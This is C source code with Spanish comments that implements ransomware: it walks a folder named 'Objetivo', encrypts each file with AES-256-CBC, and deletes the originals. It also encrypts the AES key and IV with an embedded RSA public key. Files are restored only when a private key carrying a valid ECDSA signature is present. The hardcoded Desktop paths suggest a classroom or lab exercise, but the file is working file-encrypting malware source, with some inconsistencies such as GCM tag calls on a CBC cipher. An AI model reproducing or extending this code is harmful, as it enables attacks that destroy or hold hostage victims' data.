#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <Shlwapi.h>
#include <dirent.h>
#include <direct.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/objects.h>
#include <openssl/sha.h>

const char *clavePublicaRSA = "-----BEGIN RSA PUBLIC KEY-----\n"
                              "MIIBCgKCAQEAty4ltThvy3ZjbhZ/tVkXLSUZwXffEpoj+qWymwokbCnVshS1VrS1\n"
                              "OJ8CYt0jIUPU8E9NBRvvez9PlKPpQ5EGpdJK2kriumGURM20W48SeC/8gruxw6Hg\n"
                              "gCHw3UTIQSUfAOKGkz7E3D3rW1wUkEijrHWuRz5yVc6hfCfHyA0IXGpJTJiLPjj0\n"
                              "U6XFhn1OCJ19DpjHn68yUb4UswkhyGS9WolYngeKWUIIXRevQ9e9QbfISVBI4gUg\n"
                              "PEy5+fwXDoPvuMCW3inyWcPaOzAhT/DLYfvX2Xf5SFPnm695ZUEJatOIDs+VpPH9\nntuXAsVNwjo/f8HQ8rtk32KFfxvpv+FHBwIDAQAB\n"
                              "-----END RSA PUBLIC KEY-----";
const char *clavePublicaFirma = "-----BEGIN PUBLIC KEY-----\n"
                                "MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEazNs8zbRN8SMetU61wxckxuwnxJXd6Kb\n"
                                "XoE6bafsYC5gK1DpwqCbf3lD4h/1W1O65RFQua4EF4iqO4uKNq8w/g==\n"
                                "-----END PUBLIC KEY-----";

// Función para cargar la clave pública de ECDSA desde una cadena PEM
EC_KEY *loadEcdsaPublicKeyFromPEM(const char *pemKey) {
    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);
    if (!bio) {
        perror("Error al crear el objeto BIO para la clave pública de ECDSA");
        return NULL;
    }

    EC_KEY *publicKey = PEM_read_bio_EC_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);

    if (!publicKey) {
        perror("Error al leer la clave pública de ECDSA desde la cadena PEM");
        return NULL;
    }

    return publicKey;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    printf("carencias");
    abort();
}

int verifyWithECDSA(const char *clave_publica, const char *ruta_archivo, const char *firma_file_path) {
    FILE *rsaPV = fopen(ruta_archivo, "rb");
    if (!rsaPV)
        return 0;

    fseek(rsaPV, 0L, SEEK_END); // puntero a final archivo

    long file_size = ftell(rsaPV); // determina el tamaño del archivo

    rewind(rsaPV); // Puntero vuelve a inicio del archivo

    unsigned char *data = malloc(file_size); // Asigna memoria para almacenar el contenido del archivo
    if (!data) {
        fclose(rsaPV);
        return 0;
    }

    fread(data, 1, file_size, rsaPV);
    fclose(rsaPV);

    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(data, file_size, hash);

    EC_KEY *publicKey = loadEcdsaPublicKeyFromPEM(clave_publica);
    if (!publicKey) {
        // Manejar el error al cargar la clave pública
        free(data);
        return 0;
    }

    ECDSA_SIG *firma = ECDSA_SIG_new();
    if (!firma) {
        fprintf(stderr, "Error al crear la estructura de firma\n");
        free(data);
        EC_KEY_free(publicKey);
        return 0;
    }

    FILE *firma_file = fopen(firma_file_path, "rb");
    if (!firma_file) {
        fprintf(stderr, "Error al abrir el archivo de firma\n");
        free(data);
        EC_KEY_free(publicKey);
        ECDSA_SIG_free(firma);
        return 0;
    }

    fseek(firma_file, 0, SEEK_END);
    long firma_size = ftell(firma_file);
    fseek(firma_file, 0, SEEK_SET);

    unsigned char *der_signature = malloc(firma_size);
    if (!der_signature) {
        fprintf(stderr, "Error al asignar memoria para la firma DER\n");
        fclose(firma_file);
        free(data);
        EC_KEY_free(publicKey);
        ECDSA_SIG_free(firma);
        return 0;
    }

    fread(der_signature, 1, firma_size, firma_file);
    fclose(firma_file);

    const unsigned char *der_signature_ptr = der_signature;

    if (!(firma = d2i_ECDSA_SIG(NULL, &der_signature_ptr, firma_size))) {
        fprintf(stderr, "Error al leer la firma\n");
        free(der_signature);
        free(data);
        EC_KEY_free(publicKey);
        ECDSA_SIG_free(firma);
        return 0;
    }

    free(der_signature);  // Liberar la memoria asignada para la firma DER

    int verificacion = ECDSA_do_verify(hash, SHA256_DIGEST_LENGTH, firma, publicKey);

    if (verificacion == 1) {
        printf("Verificación exitosa\n");
    } else {
        printf("Verificación fallida\n");
    }

    free(data);
    EC_KEY_free(publicKey);
    ECDSA_SIG_free(firma);

    return verificacion;
}

/*int verifyWithECDSA(const char *public_key_path, const char *file_path, const char *signature_path) {
    int ret = 1;

    // Leer la clave pública

    EC_KEY *public_key = loadEcdsaPublicKeyFromPEM(clavePublicaFirma);
    if (!public_key)
        handleErrors();

    // Leer el archivo a verificar
    FILE *file = fopen(file_path, "rb");
    if (!file)
        handleErrors();

    fseek(file, 0L, SEEK_END); // Puntero a final archivo

    long file_size = ftell(file); // Determina el tamaño del archivo

    rewind(file); // Puntero vuelve a inicio del archivo

    unsigned char *data = malloc(file_size); // Asigna memoria para almacenar el contenido del archivo
    if (!data)
        handleErrors();

    fread(data, 1, file_size, file);
    fclose(file);

    // Leer la firma a verificar
    FILE *signature_file = fopen(signature_path, "rb");
    if (!signature_file)
        handleErrors();

    fseek(signature_file, 0L, SEEK_END); // Puntero a final archivo

    long signature_size = ftell(signature_file); // Determina el tamaño de la firma

    rewind(signature_file); // Puntero vuelve a inicio del archivo

    unsigned char *signature_data = malloc(signature_size); // Asigna memoria para almacenar la firma
    if (!signature_data)
        handleErrors();

    fread(signature_data, 1, signature_size, signature_file);
    fclose(signature_file);

    // Verificar la firma
    ECDSA_SIG *signature = d2i_ECDSA_SIG(NULL, (const unsigned char**)&signature_data, signature_size);
    if (!signature)
        handleErrors();

    if (ECDSA_do_verify(data, file_size, signature, public_key) != 1) {
        fprintf(stderr, "Error al verificar la firma\n");
        ERR_print_errors_fp(stderr); // Imprimir detalles del error
        ret = 0; // La verificación falló
    } else {
        ret = 1;
        printf("La firma es válida.\n");
        return ret;
    }
    // Liberar recursos
    ECDSA_SIG_free(signature);
    EC_KEY_free(public_key);
    free(data);
    free(signature_data);

    return ret;
}*/

RSA *parseRSAPublicKeyFromPEMString(const char *pemKey) {
    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);  // -1 para que BIO determine la longitud automáticamente

    if (bio == NULL) {
        // Manejar el error
        return NULL;
    }

    RSA *rsa = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);

    if (rsa == NULL) {
        // Manejar el error
        BIO_free(bio);
        return NULL;
    }

    BIO_free(bio);
    return rsa;
}

void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
    // Abre el archivo de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(publicKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos del archivo de entrada y los encripta con la clave pública
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int encryptedSize = RSA_public_encrypt(bytesRead, inputBuffer, outputBuffer, publicKey, RSA_PKCS1_PADDING);
            if (encryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, encryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void decryptWithPrivateKey(const char* inputFileName, const char* outputFileName, RSA* privateKey) {
    // Abre el archivo cifrado de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(privateKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos cifrados del archivo de entrada y los descifra con la clave privada
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int decryptedSize = RSA_private_decrypt(bytesRead, inputBuffer, outputBuffer, privateKey, RSA_PKCS1_PADDING);
            if (decryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, decryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void generateRandomKey(unsigned char *key, int keyLength) {
    RAND_bytes(key, keyLength);
}

void generateRandomIV(unsigned char *iv, int ivLength) {
    RAND_bytes(iv, ivLength);
}

void saveKeyToFile(const char *keyFileName, const unsigned char *key, int keyLength) {
    FILE *keyFile = fopen(keyFileName, "wb");
    if (keyFile) {
        fwrite(key, 1, keyLength, keyFile);
        fclose(keyFile);
    }
}

void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength) {
    FILE *ivFile = fopen(ivFileName, "wb");
    if (ivFile) {
        fwrite(iv, 1, ivLength, ivFile);
        fclose(ivFile);
    }
}


int main()
{

    // Inicializamos OpenSSL//
    OpenSSL_add_all_algorithms();

    // Definir la clave y el vector de inicialización (IV)
    unsigned char key[32];
    unsigned char iv[16];
    // Definir la ruta completa al archivo de la clave
    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt"; 
    const char *EnckeyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt.enc"; 

    // Definir la ruta completa al archivo del IV
    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt"; 
    const char *EncivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt.enc"; 

    // Definimos la carpeta a encriptar//
    const char *Target = "C:\\Users\\usuario\\Desktop\\Objetivo";
    DIR *Victim = opendir(Target);

    const char *Encriptado = "C:\\Users\\usuario\\Desktop\\Encriptados";
    const char *Clave = "C:\\Users\\usuario\\Desktop";
    
    struct dirent *File;

    // claves RSA //
    const char *firma = "C:\\Users\\usuario\\Desktop\\firma_ecdsa.txt";
    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\clave_privada_rsa.pem";

    if ((File = readdir(Victim)) != NULL){
    int Envirao = mkdir(Encriptado);
    int Secreto = mkdir(Clave);
    generateRandomKey(key, sizeof(key));
    generateRandomIV(iv, sizeof(iv));

    // Lectura de los archivos del fichero //
    while ((File = readdir(Victim)) != NULL)
    {   
        
        if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
            printf("Nombre del archivo: %s\n", File->d_name);

          LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // ENCRIPTAMOS //
            if(_stricmp(extension, ".crf") != 0){
                char inputFileName[1024];
                PathCombineA(inputFileName, Target, File->d_name);
                printf("Ruta del archivo: %s\n", inputFileName);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".crf";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                strcat(PathCombineA(outputFileName, Encriptado, File->d_name), enc); // Concatenar la extensión ".enc"

                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida

                // Comprobamos la correcta apertura de los ficheros //
                if(inputFile && outputFile){
                    printf("se abren bien los archivos");
                    // Creamos el contexto
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a encriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_EncryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_EncryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }

                    saveIVToFile(ivFileName,iv,sizeof(iv));
                    saveKeyToFile(keyFileName,key,sizeof(key));

                    RSA *rsa = parseRSAPublicKeyFromPEMString(clavePublicaRSA);
                    encryptWithPublicKey(keyFileName,EnckeyFileName,rsa);
                    encryptWithPublicKey(ivFileName,EncivFileName,rsa);
                    RSA_free(rsa);
                    
                    remove(inputFileName);
                    rmdir(Target);

                }else {
                    printf("Error al abrir uno o ambos archivos.\n");
                }
            }
        } 
    }
    }else {
        if (verifyWithECDSA(clavePublicaFirma, PrivateKey, firma)) {
        // El código dentro de este bloque se ejecutará solo si la firma es válida.
        FILE *privateKeyFileSigned = fopen(PrivateKey, "rb");
        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFileSigned, NULL, NULL, NULL);
        fclose(privateKeyFileSigned);
        decryptWithPrivateKey(EnckeyFileName, keyFileName, clavePrivada);
        decryptWithPrivateKey(EncivFileName, ivFileName, clavePrivada);
        RSA_free(clavePrivada);

        int Objetivo = mkdir(Target);
        DIR *Envirao = opendir(Encriptado);
        while ((File = readdir(Envirao)) != NULL){
            
            if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
                LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // Desencriptamos //
            if(_stricmp(extension, ".crf") == 0){
                printf("La extensión es .crf \n");
                // Lee la clave y la extrae//
                FILE *keyFile = fopen(keyFileName, "rb");
                fread(key, 1, sizeof(key), keyFile);
                fclose(keyFile);

                // Comprueba que IV existe, lo lee y lo extrae//
                FILE *ivFile = fopen(ivFileName, "rb");
                if (ivFile) {
                fread(iv, 1, sizeof(iv), ivFile);
                fclose(ivFile);
        
                char inputFileName[1024];
                PathCombineA(inputFileName, Encriptado, File->d_name);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".crf";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                char *encPtr = strstr(PathCombineA(outputFileName,Target,File->d_name), enc);

                // Si se encuentra la cadena ".enc", eliminarla
                if (encPtr != NULL) {
                    *encPtr = '\0'; // Establecer el carácter nulo en el lugar de ".enc"
                }
                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
                if(inputFile && outputFile){
                    printf("input y output fino \n");
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a desencriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_DecryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    // Obtener la etiqueta de autenticación del archivo encriptado
                    unsigned char tag[16];
                    fread(tag, 1, sizeof(tag), inputFile);

                    // Establecer la etiqueta de autenticación en el contexto de desencriptado
                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, sizeof(tag), tag);

                    // Verificar la autenticación
                    int result = EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    EVP_CIPHER_CTX_free(ctx);
                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }
                    remove(inputFileName);
                    
                }
                }

            }
            }
        }
        rmdir(Encriptado);
        remove(keyFileName);
        remove(ivFileName);
        remove(PrivateKey);
        } else {
            printf("Firma incorrecta");
        }

    }
    return 0;

}